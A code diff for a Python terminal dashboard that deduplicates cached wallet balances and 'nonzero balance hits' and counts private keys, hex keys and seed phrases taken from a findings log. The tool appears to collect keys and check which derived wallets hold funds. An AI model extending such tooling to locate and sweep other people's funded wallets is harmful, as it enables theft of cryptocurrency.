@@ -195,8 +195,23 @@ def load_jsonl_tail(path, n=10):
         return []
 
 
+EVM_CHAINS = {
+    "eth", "matic", "avax", "bnb", "base", "arb", "op", "monad",
+    "ftm", "cro", "gno", "scrl", "linea", "blast", "zksync",
+}
+
+
+def _norm_addr(chain, addr):
+    """Normalize (chain, addr) so EVM casing does not split the same wallet."""
+    chain = (chain or "?").lower()
+    addr = addr or ""
+    if chain in EVM_CHAINS:
+        return chain, addr.lower()
+    return chain, addr
+
+
 def summarize_balances():
-    """Aggregate cached balances. Prefer newest ts per (chain, addr)."""
+    """Aggregate cached balances. Prefer newest ts per normalized (chain, addr)."""
     totals = defaultdict(float)
     latest = {}
     latest_ts = {}
@@ -217,45 +232,74 @@ def summarize_balances():
                 addr = rec.get("address") or ""
                 if not addr:
                     continue
-                key = (chain, addr)
+                key = _norm_addr(chain, addr)
                 ts = float(rec.get("ts") or 0)
                 if key in latest_ts and ts < latest_ts[key]:
                     continue
                 latest_ts[key] = ts
                 bal = rec.get("balance")
-                latest[key] = bal
+                if bal is None and (rec.get("settled") or rec.get("invalid")):
+                    bal = 0.0
+                # keep display address from newest record
+                latest[key] = {"balance": bal, "address": addr, "checked_at": rec.get("checked_at"), "ts": ts}
                 ca = rec.get("checked_at")
                 if ca and (newest_check is None or ca > newest_check):
                     newest_check = ca
-        for (chain, addr), bal in latest.items():
-            # Ignore sub-dust balances (e.g. 4e-17 wei-rounding noise)
+        # flatten to (chain, display_addr) -> bal for callers
+        flat = {}
+        for (chain, _naddr), info in latest.items():
+            bal = info["balance"]
+            flat[(chain, info["address"])] = bal
             if isinstance(bal, (int, float)) and bal > 1e-12:
-                totals[chain] += bal
-        return totals, latest, newest_check
+                totals[chain] += float(bal)
+        return totals, flat, newest_check
     except Exception:
         return totals, latest, newest_check
 
 
 def nonzero_hits():
-    hits = []
-    if not os.path.exists(HITS_FILE):
-        return hits
-    try:
-        with open(HITS_FILE, "r", encoding="utf-8", errors="ignore") as f:
-            for line in f:
-                line = line.strip()
-                if not line:
-                    continue
-                try:
-                    rec = json.loads(line)
-                except Exception:
-                    continue
-                bal = rec.get("balance")
-                if bal and bal > 0:
-                    hits.append(rec)
-        return hits
-    except Exception:
-        return hits
+    """Deduped nonzero hits (cache + hits file), highest balance wins."""
+    best = {}  # norm_key -> rec
+    for path in (CACHE_FILE, HITS_FILE):
+        if not os.path.exists(path):
+            continue
+        try:
+            with open(path, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        rec = json.loads(line)
+                    except Exception:
+                        continue
+                    bal = rec.get("balance")
+                    if not isinstance(bal, (int, float)) or bal <= 1e-12:
+                        continue
+                    chain = (rec.get("chain") or "?").lower()
+                    addr = rec.get("address") or ""
+                    if not addr:
+                        continue
+                    nk = _norm_addr(chain, addr)
+                    prev = best.get(nk)
+                    pts = float((prev or {}).get("ts") or 0)
+                    ts = float(rec.get("ts") or 0)
+                    # prefer higher balance; tie-break newer ts
+                    if prev is None or float(bal) > float(prev.get("balance") or 0) or (
+                        float(bal) == float(prev.get("balance") or 0) and ts >= pts
+                    ):
+                        best[nk] = {
+                            "chain": chain,
+                            "address": addr,
+                            "balance": float(bal),
+                            "ts": ts,
+                            "checked_at": rec.get("checked_at"),
+                            "source": rec.get("source") or path,
+                        }
+        except Exception:
+            pass
+    hits = sorted(best.values(), key=lambda r: -float(r.get("balance") or 0))
+    return hits
 
 
 def latest_memory_highlights(n=8):
@@ -281,9 +325,17 @@ def latest_memory_highlights(n=8):
 
 
 def wallet_truth_summary(max_wallets=6):
-    """Fast wallet truth from cache + memory tail. Never blocks the dash."""
+    """Wallet truth from balance cache + hits. Never blocks the dash.
+
+    Previous bug: only matched memory-tail derived_addresses (case-sensitive)
+    against cache, so funded hits showed total=0 even when cache had balance.
+    Now: truth = every nonzero cached/hit address (deduped, EVM-normalized),
+    plus unique key counts from a memory tail for context.
+    """
     try:
-        balances = {}
+        # --- balances: newest per normalized key ---
+        balances = {}  # norm -> (display_chain, display_addr, bal, ts, checked_at)
+        newest = None
         if os.path.exists(CACHE_FILE) and os.path.getsize(CACHE_FILE) > 0:
             with open(CACHE_FILE, "r", encoding="utf-8", errors="ignore") as f:
                 for line in f:
@@ -296,16 +348,63 @@ def wallet_truth_summary(max_wallets=6):
                         continue
                     chain = (rec.get("chain") or "?").lower()
                     addr = rec.get("address") or ""
-                    if addr:
-                        balances[(chain, addr)] = rec.get("balance")
+                    if not addr:
+                        continue
+                    nk = _norm_addr(chain, addr)
+                    ts = float(rec.get("ts") or 0)
+                    prev = balances.get(nk)
+                    if prev and prev[3] > ts:
+                        continue
+                    bal = rec.get("balance")
+                    if bal is None and (rec.get("settled") or rec.get("invalid")):
+                        bal = 0.0
+                    ca = rec.get("checked_at")
+                    balances[nk] = (chain, addr, bal, ts, ca)
+                    if ca and (newest is None or ca > newest):
+                        newest = ca
 
-        wallets = 0
-        addrs = set()
+        # merge hits file (may have fresher nonzero)
+        if os.path.exists(HITS_FILE):
+            with open(HITS_FILE, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        rec = json.loads(line)
+                    except Exception:
+                        continue
+                    bal = rec.get("balance")
+                    if not isinstance(bal, (int, float)):
+                        continue
+                    chain = (rec.get("chain") or "?").lower()
+                    addr = rec.get("address") or ""
+                    if not addr:
+                        continue
+                    nk = _norm_addr(chain, addr)
+                    ts = float(rec.get("ts") or 0)
+                    prev = balances.get(nk)
+                    if prev is None or ts >= prev[3] or (
+                        isinstance(bal, (int, float))
+                        and bal > 1e-12
+                        and not (isinstance(prev[2], (int, float)) and prev[2] > 1e-12)
+                    ):
+                        # keep higher nonzero if timestamps close
+                        if prev and isinstance(prev[2], (int, float)) and prev[2] > float(bal):
+                            if ts < prev[3]:
+                                continue
+                        ca = rec.get("checked_at")
+                        balances[nk] = (chain, addr, float(bal), ts, ca)
+                        if ca and (newest is None or ca > newest):
+                            newest = ca
+
+        # --- unique keys in memory tail (context only) ---
+        key_set = set()
         if os.path.exists(MEMORY_FILE):
             with open(MEMORY_FILE, "rb") as f:
                 f.seek(0, 2)
                 size = f.tell()
-                f.seek(max(0, size - 400_000))
+                f.seek(max(0, size - 2_000_000))
                 tail = f.read().decode("utf-8", errors="ignore")
             for line in tail.splitlines():
                 line = line.strip()
@@ -317,33 +416,42 @@ def wallet_truth_summary(max_wallets=6):
                     continue
                 findings = rec.get("findings") or {}
                 wallet = findings.get("wallet") or {}
-                if wallet.get("wifs") or wallet.get("hex_keys") or wallet.get("seed_phrases"):
-                    wallets += 1
-                for d in findings.get("derived_addresses") or []:
-                    c = (d.get("chain") or "?").lower()
-                    a = d.get("address") or ""
-                    if a:
-                        addrs.add((c, a))
+                for wif in wallet.get("wifs") or []:
+                    if wif:
+                        key_set.add(("WIF", str(wif).strip()))
+                for hx in wallet.get("hex_keys") or []:
+                    if not hx:
+                        continue
+                    h = str(hx).strip().lower().removeprefix("0x")
+                    if len(h) == 64:
+                        key_set.add(("HEX", h))
+                for seed in wallet.get("seed_phrases") or []:
+                    if seed:
+                        key_set.add(("SEED", str(seed).strip()))
 
         nonzero = []
         pending = 0
+        zeroed = 0
         total = 0.0
-        seen = addrs if addrs else set(balances.keys())
-        for k in seen:
-            bal = balances.get(k)
+        for nk, (chain, addr, bal, ts, ca) in balances.items():
             if bal is None:
                 pending += 1
             elif isinstance(bal, (int, float)) and bal > 1e-12:
-                nonzero.append((k[0], k[1], float(bal)))
+                nonzero.append((chain, addr, float(bal)))
                 total += float(bal)
+            elif isinstance(bal, (int, float)):
+                zeroed += 1
         nonzero.sort(key=lambda x: -x[2])
+
         return {
-            "wallets": wallets,
-            "addresses": len(addrs) if addrs else len(seen),
+            "wallets": len(key_set),
+            "addresses": len(balances),
             "nonzero": nonzero[:12],
+            "nonzero_count": len(nonzero),
             "pending": pending,
+            "zeroed": zeroed,
             "total": total,
-            "newest": None,
+            "newest": newest,
         }
     except Exception:
         return None
@@ -436,15 +544,15 @@ def render(spinner_char=""):
         lines.append("  (no balances cached yet)")
     lines.append("")
 
-    # Wallet-derived truth (never padded with unrelated cache rows)
+    # Wallet truth = cache/hits (deduped). Key count from memory tail.
     wt = wallet_truth_summary()
     if wt is not None:
-        lines.append(f"{BOLD}  WALLET VIEW (LIVE CACHE / DERIVED KEYS ONLY){RESET}")
+        nz_n = wt.get("nonzero_count", len(wt.get("nonzero") or []))
+        lines.append(f"{BOLD}  WALLET TRUTH (CACHE + HITS, DEDUPED){RESET}")
         lines.append(thin)
-        lines.append(f"  Wallets reconstructed : {wt['wallets']}")
-        lines.append(f"  Unique addresses      : {wt['addresses']}")
-        lines.append(f"  With nonzero balance  : {len(wt['nonzero'])}")
-        lines.append(f"  Pending / failed RPC  : {wt['pending']}")
+        lines.append(f"  Unique keys (mem tail): {wt['wallets']:,}")
+        lines.append(f"  Addresses in cache    : {wt['addresses']:,}")
+        lines.append(f"  Nonzero / zero / pend : {nz_n} / {wt.get('zeroed', 0)} / {wt['pending']}")
         lines.append(f"  Total nonzero         : {GREEN}{wt['total']:,.8f}{RESET}")
         if wt.get("newest"):
             lines.append(f"  Last on-chain check   : {wt['newest']}")
@@ -454,19 +562,22 @@ def render(spinner_char=""):
                     f"  {GREEN}***{RESET} {color_chain(chain)} {addr:<42s} {bal:,.8f}"
                 )
         else:
-            lines.append("  (no nonzero balances on reconstructed wallets)")
-        lines.append(f"  {DIM}Run: walletview   (live RPC force-refresh loop){RESET}")
+            lines.append("  (no nonzero balances in cache/hits yet)")
+        lines.append(f"  {DIM}Run: walletview   (paged live viewer){RESET}")
         lines.append("")
 
     if hits:
-        lines.append(f"{BOLD}  NONZERO BALANCE HITS ({len(hits)} total){RESET}")
+        lines.append(f"{BOLD}  NONZERO BALANCE HITS ({len(hits)} unique){RESET}")
         lines.append(thin)
-        for rec in hits[-8:]:
+        for rec in hits[:8]:
             chain = rec.get("chain", "?")
             addr = rec.get("address", "")
             bal = rec.get("balance", 0)
-            when = rec.get("checked_at", "?")[11:19] if rec.get("checked_at") else "?"
+            when = (rec.get("checked_at") or "?")
+            when = when[11:19] if "T" in when else when[:8]
             lines.append(f"  [{when}] {color_chain(chain)} {addr:<42s} {bal:,.8f}")
+        if len(hits) > 8:
+            lines.append(f"  {DIM}… +{len(hits) - 8} more{RESET}")
         lines.append("")
 
     mem = latest_memory_highlights(n=6)
